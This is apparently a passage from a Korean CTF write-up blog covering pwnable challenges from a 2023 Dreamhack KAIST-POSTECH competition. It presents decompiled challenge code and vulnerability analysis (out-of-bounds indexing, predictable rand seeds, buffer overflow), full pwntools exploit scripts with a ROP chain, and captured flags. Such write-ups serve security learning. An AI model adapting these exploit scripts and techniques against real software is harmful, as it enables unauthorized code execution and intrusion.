mildang_gauge[choice]; } mildang_gauge[choice] = v3; 이때 choice에 대한 OoB addition, subtraction이 가능하다. 이때 약간의 조건들이 있는데 이러한 조건들은 OoB를 통해 해결한다.\nstd::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Phone number: \u0026#34;); read(0, buf, 255uLL); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Message: \u0026#34;); read(0, v13, 255uLL); v1 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;[\u0026#34;); v2 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v1, buf); v3 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v2, \u0026#34;]\u0026#34;);// info leak std::ostream::operator\u0026lt;\u0026lt;(v3, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, v13); std::ostream::operator\u0026lt;\u0026lt;(v4, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Sent!\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v5, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); if ( rand() % 10 ) { v9 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Oh !!!!!!!!!! She did not replied,, ,, :(!\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v9, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } else { v6 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Oh !!!!!!!!!! She replied,, ,, Yes!\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v6, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v7 = rand() % 6; v8 = g_sms_index++; sms_list[v8] = msg[v7]; } } memory leak이 가능하며 money는 unsigned 비교를 거친다. 이를 이용해 나중에 integer overflow \u0026amp; underflow를 트리거해버리면 된다.\nmoney -= 100000; v3 = rand(); if ( !((int)v3 % 0xBEBC200) \u0026amp;\u0026amp; charming \u0026gt; 100000 ) { v0 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Oh!\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v0, v3); std::ostream::operator\u0026lt;\u0026lt;(); Get_shell(); } v1 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;-_-\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v1, v3); std::ostream::operator\u0026lt;\u0026lt;(); return broke_again(); } 4바이트 정도는 충분히 bruteforce로 뚫을만하다. 하지만 charming을 증가시키려 앞선 random들을 뚫으려면 300초안에 불가능하다.\nExploit script # 1) srand seed prediction is possible. cuz it is only 2 bytes long. # 2) info leak is possible u can get the base of binary, stack # 3) place get shell func through OoB add # 4) modify gamestep to exec that func from pwn import * import ctypes libc = ctypes.CDLL(\u0026#39;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) def seed_brute(arr): global libc ret = [] for i in range(0x10000): libc.srand(i) f = 1 for j in arr: if j != (libc.rand()%10): f = 0 break if f: ret.append(i) return ret sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) # p = process(\u0026#39;./bdh\u0026#39;) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;,20804) def get_charm(): sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) rvu(b\u0026#39;[Charming Point]: \u0026#39;) n = int(rvu(b\u0026#39;.\u0026#39;)[:-1]) return n res = [] diff = 500 for i in range(0x20): v = get_charm() diff -= v res.append(diff) diff = v ret = seed_brute(res) assert len(ret) == 1 ret = ret[0] success(f\u0026#39;seed : {ret}\u0026#39;) libc.srand(ret) for i in range(len(res)): libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;3\u0026#39;) pay = b\u0026#39;A\u0026#39;*0xa8 sa(b\u0026#39;: \u0026#39;, pay) pay = b\u0026#39;A\u0026#39;*0x40 sa(b\u0026#39;: \u0026#39;, pay) rvu(b\u0026#39;A\u0026#39;*0xa8) libc_base = u64(rvu(b\u0026#39;]\u0026#39;)[:-1].ljust(8,b\u0026#39;\\x00\u0026#39;)) - 0x8aeed success(hex(libc_base)) rvu(b\u0026#39;A\u0026#39;*0x40) bin_base = u64(rvu(b\u0026#39;\\x0a\u0026#39;)[:-1].ljust(8,b\u0026#39;\\x00\u0026#39;)) - 0x81a0 success(hex(bin_base)) if ((libc.rand()%10) == 0): libc.rand() # functon ptr # -824 -\u0026gt; binary_ptr # ptr diff rw - 0x5fb1 # lovegauge # oob idx -\u0026gt; -101 * 8 def oob_add(idx, x): global libc while True: r = libc.rand() is_add = not (r\u0026amp;1) if is_add: val = (libc.rand()) \u0026amp; 0xff # success(f\u0026#39;adding: {hex(x)}\u0026#39;) x -= val libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) sla(b\u0026#39;Choose: \u0026#39;,str(idx)) if x \u0026lt;= 0: break else: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) def oob_sub(idx, x,f): global libc while True: is_sub = (libc.rand()\u0026amp;1) if is_sub: if f==0: val = (libc.rand()) % 10 else: val = (libc.rand()) \u0026amp; 0xff # success(f\u0026#39;subtracting: {hex(x)}\u0026#39;) if f: if (x - val) \u0026lt; 0: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) continue x -= val libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) # if idx == -102: # print(hex(val)) # pause() sla(b\u0026#39;Choose: \u0026#39;,str(idx)) rvu(b\u0026#39;[Love Gauge]: \u0026#39;) n = int(rvu(b\u0026#39;.\u0026#39;)[:-1]) if f: if n \u0026lt; 0: oob_add(-101, 0x50) if f: if x == 0: break else: if x \u0026lt;= 0: break else: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) def oob_sub_at_once(idx, x): global libc while True: is_sub = (libc.rand()\u0026amp;1) if is_sub: val = (libc.rand()) \u0026amp; 0xff # success(f\u0026#39;subtracting: {hex(x)}\u0026#39;) if val != x: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) continue x -= val libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) sla(b\u0026#39;Choose: \u0026#39;,str(idx)) if x == 0: break else: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) oob_sub(-0x67, 0x5fb1, 1) # preparing function ptr success(b\u0026#39;prepared fptr\u0026#39;) r = libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) rvu(b\u0026#39;[Love Gauge]: \u0026#39;) n = int(rvu(b\u0026#39;.\u0026#39;)[:-1]) success(f\u0026#39;gauge: {n}\u0026#39;) x = n + 200 while True: tmp = libc.rand() is_sub = (tmp\u0026amp;1) if is_sub: libc.rand() val = tmp % 10 if (x - val) \u0026lt; 0: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) continue x -= val libc.rand() sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) sla(b\u0026#39;Choose: \u0026#39;,str(-100)) if x == 0: break else: sla(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) rvu(b\u0026#39;[Love Gauge]: \u0026#39;) n = int(rvu(b\u0026#39;.\u0026#39;)[:-1]) success(f\u0026#39;gauge: {n}\u0026#39;) pause() oob_sub_at_once(-102, 1+0x77) # preparing function ptr p.interactive() # KAPO{ac98a027d8c41b726576b169f4c5bba187be5bb2d3a9e88523f5ea0a2264ef4a} gamestep을 덮고, 마지막에 SIGSEGV를 내주면 handler가 호출되면서 임의 주소에 대한 호출 primitive를 만들 수 있다. 미리 OoB addition으로 함수 포인터 주소를 만들고 idx를 변조해 임의 주소에 대한 호출을 통해 shell을 획득한다.\nAvatar: Crude Shadow Analysis push_shadow(\u0026amp;shadow_sp, shadow_stack); setup(); init_seccomp(); // useless puts(\u0026#34;shadow test\u0026#34;); exit = 0; do { menu(); __isoc99_scanf(\u0026#34;%d\u0026#34;); switch ( in ) { case 1: print_shadow(shadow_sp, shadow_stack); break; case 2: puts(\u0026#34;string input:\u0026#34;); read(0, buf, 0x400uLL); break; case 3: nested_func(\u0026amp;shadow_sp, shadow_stack); break; case 4: puts(\u0026#34;lol you can\u0026#39;t\u0026#34;); break; case 5: exit = 1; break; default: puts(\u0026#34;nono\u0026#34;); break; } } while ( !exit ); print_shadow(shadow_sp, shadow_stack); pop_shadow(\u0026amp;shadow_sp, shadow_stack); return 0; } shadow stack이 구현되어있다.\nExploitation bof를 대놓고 준다.\nExploit script from pwn import * sla = lambda x,y :p.sendlineafter(x,y) rvu = lambda x : p.recvuntil(x) \\#p = process(\u0026#39;./avatar\u0026#39;,env={\u0026#39;LD_PRELOAD\u0026#39;:\u0026#39;../libc.so.6\u0026#39;}) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;,10351) context.binary = e = ELF(\u0026#39;./avatar\u0026#39;) libc = ELF(\u0026#39;../libc.so.6\u0026#39;) sla(b\u0026#39;5\u0026#39;,b\u0026#39;3\u0026#39;) sla(b\u0026#39;2\u0026#39;,b\u0026#39;1\u0026#39;) rvu(b\u0026#39;:\\n\u0026#39;) libc_base = int(rvu(\u0026#39;\\n\u0026#39;)[:-1],16) - 0x29d90 bin_base = int(rvu(\u0026#39;\\n\u0026#39;)[:-1],16) - 0x1782 success(hex(libc_base)) success(hex(bin_base)) sla(b\u0026#39;2\u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;2\u0026#39;,b\u0026#39;2\u0026#39;) payload = b\u0026#39;\u0026#39; payload += p64(libc_base + 0x0000000000029cd6) payload += b\u0026#39;A\u0026#39;*0x50 payload += p64(11) payload += p64(libc_base + 0x0000000000029cd6) payload += p64(libc_base + 0x0000000000029cd6) prdi = p64(libc_base + 0x000000000002a3e5) prax = p64(libc_base + 0x0000000000045eb0) prsi = p64(libc_base + 0x000000000002be51) prdxr12 = p64(libc_base + 0x000000000011f497) payload += prdi payload += p64(0) payload += prsi payload += p64(e.bss() + bin_base+ 0x500) payload += prdxr12 payload += p64(0x200)*2 payload += p64(libc_base + libc.sym.read) payload += prdi payload += p64(e.bss() + bin_base + 0x500) payload += prsi payload += p64(0) payload += prdxr12 payload += p64(0)*2 payload += p64(libc_base + libc.sym.open) payload += prdi payload += p64(3) payload += prsi payload += p64(e.bss() + bin_base+ 0x500) payload += prdxr12 payload += p64(0x200)*2 payload += p64(libc_base + libc.sym.read) payload += prdi payload += p64(1) payload += prsi payload += p64(e.bss() + bin_base+ 0x500) payload += prdxr12 payload += p64(0x200) payload += p64(0x200) payload += p64(libc_base + libc.sym.write) success(hex(len(payload))) prdxr12 = p64(libc_base + 0x000000000011f497) p.sendafter(b\u0026#39;input:\u0026#39;,payload) p.sendafter(b\u0026#39;5\u0026#39;,b\u0026#39;5\u0026#39;) sleep(0.2) pause() p.send(b\u0026#39;../flag\u0026#39;) p.interactive() # POKA{150_PLUS_ISO_T0T4L_300_HE4D} ","permalink":"https://msh1307.kr/blog/dreamhack_kaist_postech_ctf_2023/","summary":"개인전으로 2위를 했다. 2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.\nsonofthec Analysis 인터넷 검색을 통해 enum을 복구한다. methods_fn[0] = (__int64)exit_with_code; methods_fn[1] = (__int64)register; methods_fn[2] = (__int64)login; methods_fn[3] = (__int64)token_status; methods_fn[4] = (__int64)update; methods_fn[5] = (__int64)logout; result = upload; methods_fn[6] = (__int64)upload; json으로 입력을 받고 그에 따른 핸들러를 호출한다.\nread_secret(); args = json_object_object_get(json_obj, \u0026#34;args\u0026#34;); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;username\u0026#34;); chk_string((__int64)STR); object.username = json_object_get_string(STR); usr_name_len = strlen((const char *)object.","title":"Dreamhack Kaist Postech CTF"},{"content":"PCPU 대회 끝나기 2시간정도 전에 잡았었는데, 분석하기 빡세고 구조체도 많아서 시간내로 못풀었다. 나중에 끝나고 천천히 풀어봤다. 파이프라이닝이 적용된 VCPU 컨셉의 문제다.\nAnalysis __int64 __fastcall main(int a1, char **a2, char **a3) { init_(); input_validchk(); // opcode(1byte) | operands(3bytes) while ( PC \u0026lt;= instr_sz ) { run_cycle(); ++PC; } run_cycle(); run_cycle(); run_cycle(); print_cycle(); return 0LL; } int init_() { unsigned int v0; // eax v0 = time(0LL); srand(v0); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); IF_NODE = malloc(0x10uLL); ID_NODE = malloc(0x10uLL); OF_NODE = malloc(0x10uLL); EX_NODE = malloc(0x10uLL); REG = malloc(0x20uLL); memset(REG, 0, sizeof(REG_SETS)); init_m(IF_NODE); init_m(ID_NODE); init_m(OF_NODE); init_m(EX_NODE); ANON.is_active = 1LL; // 06230 *ANON.payload = rand() % 10; ANON1.is_active = 1LL; // 16238 *ANON1.payload = rand() % 10; ANON2.is_active = 1LL; // 26240 *ANON2.payload = rand() % 10; ANON3.is_active = 1LL; // 0036248 *ANON3.payload = rand() % 10; pthread_mutex_init(\u0026amp;IF_mutex, 0LL); // 10008 pthread_mutex_init(\u0026amp;ID_mutex, 0LL); pthread_mutex_init(\u0026amp;OF_mutex, 0LL); return pthread_mutex_init(\u0026amp;mutex_4, 0LL); } void input_validchk() { const char *v0; // rax int stat_loc; // [rsp+18h] [rbp-58h] BYREF unsigned int v2; // [rsp+1Ch] [rbp-54h] char *argv[4]; // [rsp+20h] [rbp-50h] BYREF __pid_t pid; // [rsp+44h] [rbp-2Ch] char *v5; // [rsp+48h] [rbp-28h] size_t j; // [rsp+50h] [rbp-20h] FILE *stream; // [rsp+58h] [rbp-18h] void *s; // [rsp+60h] [rbp-10h] size_t i; // [rsp+68h] [rbp-8h] printf(\u0026#34;Inst Size \u0026gt; \u0026#34;); __isoc99_scanf(\u0026#34;%ld\u0026#34;, \u0026amp;instr_sz); instr = calloc(4uLL, instr_sz); for ( i = 0LL; i \u0026lt; instr_sz; ++i ) { printf(\u0026#34;Inst %lu \u0026gt; \u0026#34;, i); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;instr[i]); } PC = 0LL; s = malloc(0x20uLL); memset(s, 0, 0x20uLL); v0 = mkrandSTR(16); snprintf(s, 0x20uLL, \u0026#34;/tmp/ctf-%s\u0026#34;, v0); stream = fopen(s, \u0026#34;w\u0026#34;); fprintf(stream, \u0026#34;%lu\\n\u0026#34;, instr_sz); for ( j = 0LL; j \u0026lt; instr_sz; ++j ) fprintf(stream, \u0026#34;%d\\n\u0026#34;, instr[j]); fclose(stream); v5 = malloc(0x100uLL); memset(v5, 0, 0x100uLL); snprintf(v5, 0x100uLL, \u0026#34;python3 ./precheck.py %s 1\u0026gt;/dev/null 2\u0026gt;/dev/null\u0026#34;, s); pid = fork(); if ( pid == -1 ) { perror(\u0026#34;fork failed\u0026#34;); exit(1); } if ( !pid ) { argv[0] = \u0026#34;/bin/sh\u0026#34;; argv[1] = \u0026#34;-c\u0026#34;; argv[2] = v5; argv[3] = 0LL; v2 = execve(\u0026#34;/bin/sh\u0026#34;, argv, 0LL); printf(\u0026#34;%d\\n\u0026#34;, v2); } if ( waitpid(pid, \u0026amp;stat_loc, 0) == -1 ) { perror(\u0026#34;waitpid failed\u0026#34;); exit(1); } if ( (stat_loc \u0026amp; 0x7F) == 0 \u0026amp;\u0026amp; (stat_loc \u0026amp; 0xFF00) \u0026gt;\u0026gt; 8 == 1 ) { printf(\u0026#34;Invalid opcodes\\n\u0026#34;); exit(1); } free(s); free(v5); } 여기서 4바이트 instructions 받고 precheck.py 호출해서 유효성 검사를 수행한다.\nfrom pwn import * import sys import os f = open(sys.argv[1], \u0026#39;rb\u0026#39;) size = int(f.readline()) ops = [] for i in range(size): ops.append(p32(int(f.readline()) \u0026amp; 0xffffffff)) f.close() regs = { \u0026#39;0\u0026#39;: {\u0026#39;size\u0026#39;: 0, \u0026#39;data\u0026#39;: 0}, \u0026#39;1\u0026#39;: {\u0026#39;size\u0026#39;: 0, \u0026#39;data\u0026#39;: 0}, \u0026#39;2\u0026#39;: {\u0026#39;size\u0026#39;: 0, \u0026#39;data\u0026#39;: 0}, \u0026#39;3\u0026#39;: {\u0026#39;size\u0026#39;: 0, \u0026#39;data\u0026#39;: 0}, } for op in ops: inst = op[0] print(inst) if inst == 0: idx = op[1] data = u16(op[2:]) assert 0 \u0026lt;= idx \u0026lt;= 3 regs[str(idx)][\u0026#39;data\u0026#39;] = data elif inst == 1: dest = op[1] pad = op[2] src = op[3] assert 0 \u0026lt;= src \u0026lt;= 3 assert pad == 0 assert 0 \u0026lt;= dest \u0026lt;= 3 regs[str(dest)][\u0026#39;data\u0026#39;] = regs[str(src)][\u0026#39;data\u0026#39;] elif inst == 2: idx = op[1] size = u16(op[2:]) assert 0 \u0026lt;= idx \u0026lt;= 3 regs[str(idx)][\u0026#39;size\u0026#39;] = size regs[str(idx)][\u0026#39;data\u0026#39;] = [0 for i in range(size)] elif inst == 3: reg = op[1] idx = op[2] data = op[3] assert 0 \u0026lt;= reg \u0026lt;= 3 assert isinstance(regs[str(reg)][\u0026#39;data\u0026#39;], list) assert idx \u0026lt; regs[str(reg)][\u0026#39;size\u0026#39;] regs[str(reg)][\u0026#39;data\u0026#39;][idx] = data elif inst == 4: dest = op[1] reg = op[2] idx = op[3] assert 0 \u0026lt;= dest \u0026lt;= 3 assert 0 \u0026lt;= reg \u0026lt;= 3 assert isinstance(regs[str(reg)][\u0026#39;data\u0026#39;], list) assert idx \u0026lt; regs[str(reg)][\u0026#39;size\u0026#39;] regs[str(dest)][\u0026#39;data\u0026#39;] = regs[str(reg)][\u0026#39;data\u0026#39;][idx] elif inst == 5: reg = op[1] pad = op[2] data = op[3] assert 0 \u0026lt;= reg \u0026lt;= 3 assert pad == 0 assert isinstance(regs[str(reg)][\u0026#39;data\u0026#39;], list) assert isinstance(regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;], int) assert regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;] \u0026lt; regs[str(reg)][\u0026#39;size\u0026#39;] regs[str(reg)][\u0026#39;data\u0026#39;][regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;]] = data elif inst == 6: dest = op[1] pad = op[2] reg = op[3] assert 0 \u0026lt;= dest \u0026lt;= 3 assert 0 \u0026lt;= reg \u0026lt;= 3 assert pad == 0 assert isinstance(regs[str(reg)][\u0026#39;data\u0026#39;], list) assert isinstance(regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;], int) assert regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;] \u0026lt; regs[str(reg)][\u0026#39;size\u0026#39;] regs[str(dest)][\u0026#39;data\u0026#39;] = regs[str(reg)][\u0026#39;data\u0026#39;][regs[\u0026#39;0\u0026#39;][\u0026#39;data\u0026#39;]] elif inst == 7: pass else: assert 0 \u0026lt;= inst \u0026lt;= 7 실제 vm에서 처리될때랑은 약간 다르게 검사하긴하는데, 대강 비슷비슷하다.\n__int64 sub_26F0() { pthread_create(\u0026amp;th0, 0LL, WB_, 0LL); pthread_create(\u0026amp;th1, 0LL, EX_, 0LL); pthread_create(\u0026amp;th2, 0LL, ID2, 0LL); pthread_create(\u0026amp;th3, 0LL, ID_, 0LL); pthread_create(\u0026amp;th4, 0LL, IF_, 0LL); pthread_join(th0, 0LL); pthread_join(th1, 0LL); pthread_join(th2, 0LL); pthread_join(th3, 0LL); pthread_join(th4, 0LL); return ++cycle; } 파이프라이닝이 구현되어있다. 한 사이클에 IF, ID, ID2, EX, WB 병렬적으로 수행된다. 기본적인 5단계 파이프라이닝이랑 약간 달랐다. 앞에 Operand Fetch 같은 작업이 있을 줄 알았는데, OF라고 보기엔 그냥 디코딩에 가까워서 ID, ID2라고 네이밍했다.\nvoid *__fastcall sub_1640(void *a1) { struct IF_STR *v2; // [rsp+0h] [rbp-10h] if ( PC \u0026lt; instr_sz ) { v2 = malloc(0x10uLL); v2-\u0026gt;INSTR = instr[PC]; v2-\u0026gt;PC = PC; pthread_mutex_lock(\u0026amp;IF_mutex); reg_node(IF_NODE, v2); pthread_mutex_unlock(\u0026amp;IF_mutex); } return 0LL; } Instruction Fetch를 진행하고 IF_NODE에 등록한다.\nnode *__fastcall Register_node(node *prev_node, node *new_node) { node *result; // rax struct node *mid_node; // [rsp+8h] [rbp-18h] mid_node = malloc(0x10uLL); mid_node-\u0026gt;A = new_node; mid_node-\u0026gt;B = 0LL; if ( prev_node-\u0026gt;B ) *(prev_node-\u0026gt;B + 8) = mid_node; else prev_node-\u0026gt;A = mid_node; result = prev_node; prev_node-\u0026gt;B = mid_node; return result; } void *__fastcall ID_(void *a1) { ID_STR *v2; // [rsp+8h] [rbp-18h] struct IF_STR *R_NODE; // [rsp+10h] [rbp-10h] R_NODE = RET_R_NODE(IF_NODE); // IF_NODE -\u0026gt; MID_NODE -\u0026gt; INST_R_NODE if ( R_NODE ) { v2 = malloc(0x10uLL); v2-\u0026gt;PC = R_NODE-\u0026gt;PC; // INST_NODE *\u0026amp;v2-\u0026gt;opcode = R_NODE-\u0026gt;INSTR; v2-\u0026gt;operand2 = BYTE2(R_NODE-\u0026gt;INSTR); v2-\u0026gt;operand3 = HIBYTE(R_NODE-\u0026gt;INSTR); pthread_mutex_lock(\u0026amp;ID_mutex); reg_node(ID_NODE, v2); pthread_mutex_unlock(\u0026amp;ID_mutex); free(R_NODE); } return 0LL; } Instruction Decode. opcode와 operand를 분리한다.\nvoid *__fastcall ID_2(void *a1) { __int16 v2; // [rsp+16h] [rbp-1Ah] struct ID2_STR *v3; // [rsp+18h] [rbp-18h] struct ID_STR *n; // [rsp+20h] [rbp-10h] n = RET_R_NODE(ID_NODE); if ( n ) { v3 = malloc(0x10uLL); v3-\u0026gt;opcode = n-\u0026gt;opcode; v3-\u0026gt;PC = n-\u0026gt;PC; switch ( n-\u0026gt;opcode ) { case 0: case 2: v2 = n-\u0026gt;operand2 + (n-\u0026gt;operand3 \u0026lt;\u0026lt; 8); v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; *\u0026amp;v3-\u0026gt;operand2 = v2; break; case 1: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 3: v3-\u0026gt;flag = 1; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 4: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = n-\u0026gt;operand2; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 5: v3-\u0026gt;flag = 1; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = 0; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 6: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = n-\u0026gt;operand1; v3-\u0026gt;operand2 = 0; v3-\u0026gt;operand3 = n-\u0026gt;operand3; break; case 7: v3-\u0026gt;flag = 0; v3-\u0026gt;operand1 = 0; v3-\u0026gt;operand2 = 0; v3-\u0026gt;operand3 = 0; break; default: break; } pthread_mutex_lock(\u0026amp;ID2_mutex); reg_node(ID2_NODE, v3); pthread_mutex_unlock(\u0026amp;ID2_mutex); free(n); } return 0LL; } opcode에 따라 처리되는 operand가 다르다.\nvoid *__fastcall EX_(void *a1) { __int64 v2; // [rsp+8h] [rbp-98h] __int64 v3; // [rsp+10h] [rbp-90h] __int64 v4; // [rsp+18h] [rbp-88h] __int64 v5; // [rsp+20h] [rbp-80h] __int64 v6; // [rsp+28h] [rbp-78h] __int64 v7; // [rsp+30h] [rbp-70h] __int64 v8; // [rsp+38h] [rbp-68h] __int64 v9; // [rsp+40h] [rbp-60h] __int64 X3; // [rsp+48h] [rbp-58h] __int64 X2; // [rsp+50h] [rbp-50h] __int64 X1; // [rsp+58h] [rbp-48h] __int64 v13; // [rsp+60h] [rbp-40h] __int64 v14; // [rsp+68h] [rbp-38h] __int64 v15; // [rsp+70h] [rbp-30h] __int64 *X0; // [rsp+78h] [rbp-28h] __int64 v17; // [rsp+80h] [rbp-20h] EX_STR *v18; // [rsp+88h] [rbp-18h] struct ID2_STR *R_NODE; // [rsp+90h] [rbp-10h] R_NODE = RET_R_NODE(ID2_NODE); if ( R_NODE ) { v18 = malloc(0x18uLL); v18-\u0026gt;PC = R_NODE-\u0026gt;PC; switch ( R_NODE-\u0026gt;opcode ) { case 0: // MOV IMM v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; v18-\u0026gt;RES = *\u0026amp;R_NODE-\u0026gt;operand2; // operand1 | 0 | operand2, 3 break; case 1: // MOV REG v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; if ( R_NODE-\u0026gt;operand3 ) { switch ( R_NODE-\u0026gt;operand3 ) { case 1: v18-\u0026gt;RES = REG-\u0026gt;X1; REG-\u0026gt;X1 = 0LL; break; case 2: v18-\u0026gt;RES = REG-\u0026gt;X2; REG-\u0026gt;X2 = 0LL; break; case 3: v18-\u0026gt;RES = REG-\u0026gt;X3; REG-\u0026gt;X3 = 0LL; break; } } else { v18-\u0026gt;RES = REG-\u0026gt;X0; REG-\u0026gt;X0 = 0LL; } break; case 2: v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; v18-\u0026gt;RES = GET_STR(); break; case 3: v18-\u0026gt;INDEX = 0xFF; if ( R_NODE-\u0026gt;operand1 ) { switch ( R_NODE-\u0026gt;operand1 ) { case 1: X0 = REG-\u0026gt;X0; sleep(1u); *(X0 + R_NODE-\u0026gt;operand2 + 8) = R_NODE-\u0026gt;operand3; break; case 2: v15 = REG-\u0026gt;X0; sleep(1u); *(v15 + R_NODE-\u0026gt;operand2 + 8) = R_NODE-\u0026gt;operand3; break; case 3: v14 = REG-\u0026gt;X0; sleep(1u); *(v14 + R_NODE-\u0026gt;operand2 + 8) = R_NODE-\u0026gt;operand3; break; } } else { v17 = REG-\u0026gt;X0; sleep(1u); *(v17 + R_NODE-\u0026gt;operand2 + 8) = R_NODE-\u0026gt;operand3; } break; case 4: v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; if ( R_NODE-\u0026gt;operand2 ) { switch ( R_NODE-\u0026gt;operand2 ) { case 1: X1 = REG-\u0026gt;X1; // VULN sleep(1u); v18-\u0026gt;RES = *(X1 + R_NODE-\u0026gt;operand3 + 8);// sign extend break; case 2: X2 = REG-\u0026gt;X2; sleep(1u); v18-\u0026gt;RES = *(X2 + R_NODE-\u0026gt;operand3 + 8); break; case 3: X3 = REG-\u0026gt;X3; sleep(1u); v18-\u0026gt;RES = *(X3 + R_NODE-\u0026gt;operand3 + 8); break; } } else { v13 = REG-\u0026gt;X0; sleep(1u); v18-\u0026gt;RES = *(v13 + R_NODE-\u0026gt;operand3 + 8); } break; case 5: v18-\u0026gt;INDEX = 0xFF; if ( R_NODE-\u0026gt;operand1 ) { switch ( R_NODE-\u0026gt;operand1 ) { case 1: v8 = REG-\u0026gt;X1; sleep(1u); *(v8 + REG-\u0026gt;X0 + 8) = R_NODE-\u0026gt;operand3; break; case 2: v7 = REG-\u0026gt;X2; sleep(1u); *(v7 + REG-\u0026gt;X0 + 8) = R_NODE-\u0026gt;operand3; break; case 3: v6 = REG-\u0026gt;X3; sleep(1u); *(v6 + REG-\u0026gt;X0 + 8) = R_NODE-\u0026gt;operand3; break; } } else { v9 = REG-\u0026gt;X0; sleep(1u); *(v9 + REG-\u0026gt;X0 + 8) = R_NODE-\u0026gt;operand3; } break; case 6: v18-\u0026gt;INDEX = R_NODE-\u0026gt;operand1; if ( R_NODE-\u0026gt;operand3 ) { switch ( R_NODE-\u0026gt;operand3 ) { case 1: v4 = REG-\u0026gt;X1; sleep(1u); v18-\u0026gt;RES = *(v4 + REG-\u0026gt;X0 + 8); // vuln sign extend break; case 2: v3 = 